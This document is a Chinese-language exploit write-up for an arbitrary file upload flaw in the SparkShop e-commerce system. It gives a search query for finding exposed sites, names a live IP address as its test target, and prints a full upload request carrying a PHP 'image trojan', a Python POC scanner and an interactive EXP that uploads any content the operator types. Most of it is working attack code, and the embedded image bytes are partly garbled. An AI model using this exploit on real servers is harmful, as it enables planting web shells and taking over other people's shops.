# 南京星源图科技_SparkShop_任意文件上传漏洞

## 一、资产搜索

```
"SparkShop"
```

## 二、网站测试

```
https://120.78.188.13
```

## 三、漏洞验证

![image-20240903192519062](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240903192519062.png)

![image-20240903153907445](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240903153907445.png)

可以构造图片马，这里用echo"hello"测试

![5e3e22251193fae3be9f3f5d2ad2466](https://imagescf.oss-cn-beijing.aliyuncs.com/img/5e3e22251193fae3be9f3f5d2ad2466.png)

![82cb2c4c882db6348b4c89fd89a999d](https://imagescf.oss-cn-beijing.aliyuncs.com/img/82cb2c4c882db6348b4c89fd89a999d.png)

![5d285b38b5653c286bd8fb2538bb17b](https://imagescf.oss-cn-beijing.aliyuncs.com/img/5d285b38b5653c286bd8fb2538bb17b.png)

OK

附构造的请求包

```
POST /api/Common/uploadFile HTTP/2
Host: 120.78.188.13
Cache-Control: max-age=0
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Length: 4454

------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="file";filename="1.jpg"

?? JFIF      ? ?     		&""&0-0>>T    		&""&0-0>>T?  ? ?" ?              	?     ?  € @    ?qt{鼆x~??鞧瞡諯???%V搡陡f??php echo"hello"?>
^l澆 k?韌栠 ^z椵絓?8{*▃s囝[汬H~C嶓褳喰-賄$ 鏭C0吟"絢澢背??~迱?    @   %塂?              ? 
           ?W砗罁I;绥@?C旾&歡毼?韚锫蔧h r櫸f駔胏8        ? (        !  0P%@?   帟*T㏑?T㏑??*T㏑晑iR?U鴟?:旭晶
?x鼫l孜y`姈b?J
?Yq清 &p骱C???6怑;?珋?D膱WMK1x_*T%捀媑儳2爀X? 噂Hu秔 テz?岕魩C黒?厗弑?;y鄢湽?飃
蛻唙\
姗 h7w 抸l湿T￤莢璠蹂玪儲枷-?Q2??仔H愭-J挫嚊谹No靴哰瞘?觇a bア?挄祝?{赚高逹圫悃熔?b_馠d鉺b &紷鱢I屢=紐R根萵.C懻?x?h洎餇;D??嬽?唥?阆茣*T笷$@j胊 鐒Hr鋐X銞9#w)(I枔漡頄xx官碂PE拽
$缕狼??T￤菙N俿	aw摞?騔5洐x q变u 攙9
??1乳R?j邵萋{MA:轇vP摄rYxG浑塳塒愤q?D鉍Z瀙n<?A嗌&僲"也/C{僉G=?麨g?,C番艨j瀹枞I???蔘?X4暺L<.8?8H8c聲*T筤8^>4殞擅?镽晘灂*T㏑?T㏑??? <         !1A"2Qa0R?Bbqr亼$3`偙@CDSc掆?  	?怟?7^L弢啦€Yo?暺$崂睩??坱傓楃??―飇?倘GU鐚?+Jぐ$拡%B崧黜狗>Xn肰?贗哋永q]~M苂‘/$:窗塾∑cO>U橳礮UX?H虯詀刜蠎臒糚H塓婕DH;wB?c賌h?}?>{c?h3zT">$潫垏s膣c,巋鬕緜醚?1婜?櫠??鷚m|7焓g掾燁N熣尲W碝ン*?j#桱墼??~?骃#泇闏紐?\:?撴蠫i獉??`??籍4e曟纉o爺龂>鑠=?）?=臦﨣?_釉a?Tr舦Gm{n<懊2濼時蔹	??f???鼛E
MO 壯lWQc$t佶qy[韖9?q牓珤8邫矠荆炌<餏O捆泗?d?d磓B殌<o"鷟C?閂Wg梽z爹厊杰Z悵H胒嵕%>x彿湟=拮衹?懪bBj鄅濡湀??v6閘Sq(錅KIWc牭梱|Jq濽$t
瓢 @??涋i遠?畍鎝帞jC!轁賫O!墥?60?岌多嗊圯置J畕毼眵(茆?bW(螤?耷U拣 ?qL舻碝i4讏*闿?趂磚51S$橸屦?纜表@zQ ?緂_рpa /ГC蠁浄鈔m萂T賚婱K愬#D'柙齠芛SJ鵚駃鐛bf暲?倈髋]-U.s:S糛?4矹.乆x囘€Y)嶳絒嘙{~xzl?随ZH嘈i禌钎镛蹪駘4迢绂0X lg筸Z娴盇>M6z5熇D溫?6??尠璋d?cSnvr3?矁磃9斝?iｄY浵kTAU6__%)獊t荘?瞾亦?誙4sU偏WKT琤敠廉泝妸c.y w飒赽*?卒E馳@魴3?Zep?犚?瓍?"5.z惼$U噯o?<e5t襍睪'u伓?嵋紑玛啟)"恲瑑I?┦h葝g)(?/刋w5<T?5gh嗞)爯Mr鷹閴?台R眴xe逰i?w`P
?Q ?麚??カ搲P甓25璿=櫩? %        A?1丵a q0@懥??  ?嚁t嚧C?C??!?驇愽坹GH{D<￥=９_?  	ygI{d汲そ瞊Y襘?,?l棖t椂K?K?朇?C??!?驇愽坹GH{D<￥=?Q?衍 (9?蛭掱蓎d瞊?蛏蠎沏 F?1?樬R?sIygI{d汲そ彻d<＇v繂牡h鏴Bp嶝顡璱0^骸?粝?诧m屳H<煩蠜e宴顛=讳N媺E均?	J_9M?B??(?h頦?u?沓痂?鶖陚O??椏祼,yv鍐勔浶懅U劃绥?y堶#戶制f呴蒆勻S鼃矈揥vvv蛩Z孆蠶?~!/,?o鳻???凭Yo?傪нw場讐綄Z偾F}u釐瀙珹徫o踴_鑕漶?i??V揃n??<K?K?朇?C??葅C?f掵mi瓇妄鞌<阝啮﨤 鉆じ.Q埘SB}4/?G抓緙閨?殪縚y膛'渱繆Q~葃GH{Gr?d愜騂迆{ 窪O
晸)8A韌i)H棣/J珁]d??G絭'??JE=?F揭锒!/?蛭掱蓎d郥箾W??圧? F雃q尬冗萵n?Re7洇FH糯7沁?縥:?b??#T?l?&琖s?蛭掱五愹帎鰣yEP?鋱lC偘 To櫪??糫9?敷Xn篜-槢€?笗Ju郎5嘨%抶媜MY笫裣\?銕俰衢龠蒰r帎鰩鍉 壿	H龖?綡_"I靐舌?紐`K?K?鍧%頀蛭掱蓎gI{d汲そ瞊Y襘佘?Q??(?h嚁t嚧C?C??!?驇愽庡?  %鍧%頀蛭掱蓎gI{d汲そ瞊Y襘?,?l頨祧{=炏g迟祧{=炏g迟祧{?? &          !1A P#2abq? ? ?媄?Q??3RD匑郛?e4?$,21広牂??鵟氽]?F臛g=絧渁?W烸襏`?T$YB閈P驗VM
歶;`g嵎4.c一肴 m?斵1滿栖P??|鍏%P怌eJ?Z前?筝{)舟?'? ? +         !"1A a q2@PQ?? ? o}粏腚?2篟LJ
牓?x揻J峆}4璈虝O1>靻雁羂增{ ih)d挩? 演弱?篬!埢.N鋣訝^?輋?蛡c-寒HK~?湛*uW恼渕fZA[鲎缶堛冡?氓?獱◢牘g??宺'緧E	斚9pt悒焨畣
5A撗;,x艠"€N@孳稍朖枓b??巊鬲o 0N5隲銙8臶Dqs?w<a? 钉玆]?严簡緖|a$e$GP赎y鄡?%鲠!敁/偢@=3癎育t宧\??普?1U菎??
------WebKitFormBoundaryj7OlOPiiukkdktZR--


```

## 四、POC

注意必须在文件第一行加上

```
# coding=gb2312
# -*- coding:utf-8 -*-
```

```
def poc(target):
    payload = "/api/Common/uploadFile"
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    headers = {
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua-Mobile": "?0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/127.0.0.0Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip,deflate,br",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Priority": "u=0,i",
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR",
        "Content-Length": "4454"
    }
    data = """------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="file";filename="1.jpg"\r\n
?? JFIF      ? ?        &""&0-0>>T         &""&0-0>>T?  ? ?" ?                 ?     ?  € @    ?qt{鼆x~??鞧瞡諯???%V搡陡f??php echo"hello"?>
^l澆 k?韌栠 ^z椵絓?8{*▃s囝[汬H~C嶓褳喰-賄$ 鏭C0吟"絢澢背??~迱?    @   %塂?              ? 
           ?W砗罁I;绥@?C旾&歡毼?韚锫蔧h r櫸f駔胏8        ? (        !  0P%@?   帟*T㏑?T㏑??*T㏑晑iR?U鴟?:旭晶
?x鼫l孜y`姈b?J
?Yq清 &p骱C???6怑;?珋?D膱WMK1x_*T%捀媑儳2爀X? 噂Hu秔 テz?岕魩C黒?厗弑?;y鄢湽?飃
蛻唙\
姗 h7w 抸l湿T￤莢璠蹂玪儲枷-?Q2??仔H愭-J挫嚊谹No靴哰瞘?觇a bア?挄祝?{赚高逹圫悃熔?b_馠d鉺b &紷鱢I屢=紐R根萵.C懻?x?h洎餇;D??嬽?唥?阆茣*T笷$@j胊 鐒Hr鋐X銞9#w)(I枔漡頄xx官碂PE拽
$缕狼??T￤菙N俿    aw摞?騔5洐x q变u 攙9
??1乳R?j邵萋{MA:轇vP摄rYxG浑塳塒愤q?D鉍Z瀙n<?A嗌&僲"也/C{僉G=?麨g?,C番艨j瀹枞I???蔘?X4暺L<.8?8H8c聲*T筤8^>4殞擅?镽晘灂*T㏑?T㏑??? <         !1A"2Qa0R?Bbqr亼$3`偙@CDSc掆?      ?怟?7^L弢啦€Yo?暺$崂睩??坱傓楃??―飇?倘GU鐚?+Jぐ$拡%B崧黜狗>Xn肰?贗哋永q]~M苂‘/$:窗塾∑cO>U橳礮UX?H虯詀刜蠎臒糚H塓婕DH;wB?c賌h?}?>{c?h3zT">$潫垏s膣c,巋鬕緜醚?1婜?櫠??鷚m|7焓g掾燁N熣尲W碝ン*?j#桱墼??~?骃#泇闏紐?\:?撴蠫i獉??`??籍4e曟纉o爺龂>鑠=?）?=臦﨣?_釉a?Tr舦Gm{n<懊2濼時蔹   ??f???鼛E
MO 壯lWQc$t佶qy[韖9?q牓珤8邫矠荆炌<餏O捆泗?d?d磓B殌<o"鷟C?閂Wg梽z爹厊杰Z悵H胒嵕%>x彿湟=拮衹?懪bBj鄅濡湀??v6閘Sq(錅KIWc牭梱|Jq濽$t
瓢 @??涋i遠?畍鎝帞jC!轁賫O!墥?60?岌多嗊圯置J畕毼眵(茆?bW(螤?耷U拣 ?qL舻碝i4讏*闿?趂磚51S$橸屦?纜表@zQ ?緂_рpa /ГC蠁浄鈔m萂T賚婱K愬#D'柙齠芛SJ鵚駃鐛bf暲?倈髋]-U.s:S糛?4矹.乆x囘€Y)嶳絒嘙{~xzl?随ZH嘈i禌钎镛蹪駘4迢绂0X lg筸Z娴盇>M6z5熇D溫?6??尠璋d?cSnvr3?矁磃9斝?iｄY浵kTAU6__%)獊t荘?瞾亦?誙4sU偏WKT琤敠廉泝妸c.y w飒赽*?卒E馳@魴3?Zep?犚?瓍?"5.z惼$U噯o?<e5t襍睪'u伓?嵋紑玛啟)"恲瑑I?┦h葝g)(?/刋w5<T?5gh嗞)爯Mr鷹閴?台R眴xe逰i?w`P
?Q ?麚??カ搲P甓25璿=櫩? %        A?1丵a q0@懥??  ?嚁t嚧C?C??!?驇愽坹GH{D<￥=９_?    ygI{d汲そ瞊Y襘?,?l棖t椂K?K?朇?C??!?驇愽坹GH{D<￥=?Q?衍 (9?蛭掱蓎d瞊?蛏蠎沏 F?1?樬R?sIygI{d汲そ彻d<＇v繂牡h鏴Bp嶝顡璱0^骸?粝?诧m屳H<煩蠜e宴顛=讳N媺E均?    J_9M?B??(?h頦?u?沓痂?鶖陚O??椏祼,yv鍐勔浶懅U劃绥?y堶#戶制f呴蒆勻S鼃矈揥vvv蛩Z孆蠶?~!/,?o鳻???凭Yo?傪нw場讐綄Z偾F}u釐瀙珹徫o踴_鑕漶?i??V揃n??<K?K?朇?C??葅C?f掵mi瓇妄鞌<阝啮﨤 鉆じ.Q埘SB}4/?G抓緙閨?殪縚y膛'渱繆Q~葃GH{Gr?d愜騂迆{ 窪O
晸)8A韌i)H棣/J珁]d??G絭'??JE=?F揭锒!/?蛭掱蓎d郥箾W??圧? F雃q尬冗萵n?Re7洇FH糯7沁?縥:?b??#T?l?&琖s?蛭掱五愹帎鰣yEP?鋱lC偘 To櫪??糫9?敷Xn篜-槢€?笗Ju郎5嘨%抶媜MY笫裣\?銕俰衢龠蒰r帎鰩鍉 壿 H龖?綡_"I靐舌?紐`K?K?鍧%頀蛭掱蓎gI{d汲そ瞊Y襘佘?Q??(?h嚁t嚧C?C??!?驇愽庡?  %鍧%頀蛭掱蓎gI{d汲そ瞊Y襘?,?l頨祧{=炏g迟祧{=炏g迟祧{?? &          !1A P#2abq? ? ?媄?Q??3RD匑郛?e4?$,21広牂??鵟氽]?F臛g=絧渁?W烸襏`?T$YB閈P驗VM
歶;`g嵎4.c一肴 m?斵1滿栖P??|鍏%P怌eJ?Z前?筝{)舟?'? ? +         !"1A a q2@PQ?? ? o}粏腚?2篟LJ
牓?x揻J峆}4璈虝O1>靻雁羂增{ ih)d挩? 演弱?篬!埢.N鋣訝^?輋?蛡c-寒HK~?湛*uW恼渕fZA[鲎缶堛冡?氓?獱◢牘g??宺'緧E  斚9pt悒焨畣
5A撗;,x艠"€N@孳稍朖枓b??巊鬲o 0N5隲銙8臶Dqs?w<a? 钉玆]?严簡緖|a$e$GP赎y鄡?%鲠!敁/偢@=3癎育t宧\??普?1U菎??\r\n
------WebKitFormBoundaryj7OlOPiiukkdktZR--
    """
    res1 = requests.get(url=target,verify=False,timeout=5)
    if res1.status_code==200:
        res2 = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)

        if res2.status_code==200:
            res3 = json.loads(res2.text)
            if res3['msg']=="upload success":
                print(f"该[+]{target}存在文件上传漏洞")
                print("文件成功上传到"+res3['url']+"目录下")
            else:
                print(f"该[+]{target}不存在文件上传漏洞")
        else:
            print("访问超时，请手动测试")
```

## 五、EXP

```
def exp(target):
    while True:
        payload = "/api/Common/uploadFile"
        headers = {
            "Cache-Control": "max-age=0",
            "Sec-Ch-Ua-Mobile": "?0",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/127.0.0.0Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip,deflate,br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Priority": "u=0,i",
            "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR",
            "Content-Length": "4454"
        }

        data = """------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name="file";filename="1.jpg"\r\n
        ??? JFIF      ?? ?        &""&0-0>>T         &""&0-0>>T??  ? ?" ??                 ??     ?  ? @    ?qt{?x~????????%V搡陡f??php echo"hello"?>
        ^l? k??? ^z???8{*?s囝[?H?~C???-??$ ??C0吟"??背??~??    @   %????              ?? 
                   ?W砗?I;绥@?C?&????锫?h r?f??8        ?? (        !  0P%@??  ? ?*T???T????*T???iR??U??:旭晶
        ??x?l孜y`?b?J
        ?Yq清 &p骱C???6?;????D?WMK1x?_*T?%???2?X? ?Hu? ?テz???C???弑?;y鄢???
        ??\
        姗 h7w ?l湿T???蹂??枷-?Q2??仔H?-J挫??No靴???觇a? bア??祝?{赚高??悃熔?b_??d?b? &??I?=?R根?.C???x?h洎?;D??????阆?*T?$@j? ?Hr?X?9#?w)(I???xx?官?PE拽
        $缕狼??T??N?    aw摞??5?x q变u ?9
        ??1乳R?j邵萋{M?A:?vP摄rY?xG浑??愤q?D?Z?n<?A嗌&?"也/C{?G=??g?,C番艨j瀹枞I?????X4?L<.8?8H8c??*T?8^>4?擅?????*T???T?????? <         !1A"2Qa0R?Bbqr?$3`?@CDSc???      ????7^L??啦?Yo??$崂?????????―??倘GU??+Jぐ$?%B崧黜狗>Xn????永q]~M?‘?/$:窗塾∑cO>U??UX?H??????H?婕D?H;wB?c?h?}?>{c?h3zT">$??s膣c,????醚?1??????m|7焓g掾??N??W?ン*?j#??墼??~??#????\:????i???`??籍4e??o??>?=?）?=????_釉a?Tr?Gm{n<懊2??蔹   ???f????E
        MO ?lWQ?c$?t佶qy[?9?q??8??荆?<?O捆泗?d?d?B?<o"?C??Wg?z爹?杰Z?H??%>x?湟=拮???bBj?濡???v6?Sq(?KIWc???|Jq?$t
        瓢 @???i???????jC!??O!??60?岌多?圯置J??眵(茆?bW(??耷U拣 ?qL舻?i4?*????51S$?屦??表@zQ? ??_рpa? ?/ГC???m??T??K?#D'柙??SJ???bf???髋]-U.s:S??4?.?x??Y)???{~x?zl?随ZH嘈i?钎镛??4迢绂0X? lg?Z娴?>M6z5?D???6???璋d?cSnvr3????9??iｄY?kTAU6__%)?t???亦??4sU偏WKT??廉??c.y w飒?*?卒E?@?3?Zep?????"5.z??$U?o?<?e5t??'u??嵋?玛?)"??I??┦h?g)(?/?w5<T?5gh?)?Mr???台?R?xe?i?w`P
        ?Q ????カ?P甓25?=??? %        A?1?a q0@???  ??t?C?C??!????GH{D<￥=９_?    ygI{d汲そ?Y??,?l?t?K?K???C??!????GH{D<￥=?Q?衍? (9?蛭??d??蛏?沏? F?1??R???sIygI{d汲そ彻d<＇v?牡h?Bp嶝??0^骸?粝??诧m?H<??e宴?=讳N?E均?    J_9M?B??(?h??u?沓痂???O????,yv????U?绥?y?#?制f???S???vvv蛩Z???~!/,?o????凭Yo???нw???Z偾F}?u????o?_??漶?i???V?n??<K?K???C???C?f??mi?妄?<阝啮? ?じ.Q埘SB}4/?G抓???殪?y膛'???Q~?GH{Gr?d???{ ?O
        ?)8A?i)H棣/J?]d??G?'??JE=?F揭锒!/?蛭??d??W???? ?F?q尬冗?n?Re7洇FH糯7沁??:?b??#T?l?&?s?蛭?五???yEP??lC? To????9?敷Xn?-????Ju郎5?%??MY笫裣\???衢龠?r??? ? H???_"I?舌??`K?K??%?蛭??gI{d汲そ?Y?佘?Q??(?h?t?C?C??!?????  %?%?蛭??gI{d汲そ?Y??,?l?祧{=?g迟祧{=?g迟祧{??? &          !1A P#2abq?? ? ????Q??3R?D?郛?e4?$,?21?????氽]?F?g?=???W??`?T$YB?P?VM
        ?;`g?4.c一肴 m??1?栖P??|?%P?eJ?Z前?筝{)舟?'? ?? +         !"1A a q2@PQ?? ? ?o}?腚?2?LJ
        ??x?J?}4??O1>?雁?增{ ih)d??? 演弱??!?.N??^????c-寒HK~?湛*uW恼?fZA[鲎缶????氓????g???'?E  ?9pt悒??
        ?5A??;,x?"?N@孳稍??b???鬲o 0N5??8?Dqs?w<a? 钉??]?严??|?a$e$GP赎y??%鲠!?/?@=3?育t?\???普??1U????\r\n"""
        data1 = "\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--"
        proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080',
        }
        data2 = input("请输入要上传的文件内容(q退出)\n>>>>>>>>>>>>")
        res1 = requests.get(url=target, verify=False, timeout=5)
        try:
            if data2 == 'q':
                exit()
            if res1.status_code == 200:
                res2 = requests.post(url=target + payload, headers=headers, data=data+data2+data1, verify=False, timeout=5,proxies=proxies)
                if res2.status_code == 200:
                    res3 = json.loads(res2.text)
                    if res3['msg'] == "upload success":

                        print(f"文件成功上传到"+res3["data"]['url'])
                    else:
                        print(f"该[+]{target}不存在文件上传漏洞")
                else:
                    print("访问超时，请手动测试")
        except Exception as e:
            print(e)
```



## 六、测试结果

![image-20240903170849870](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240903170849870.png)

![image-20240903170611311](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240903170611311.png)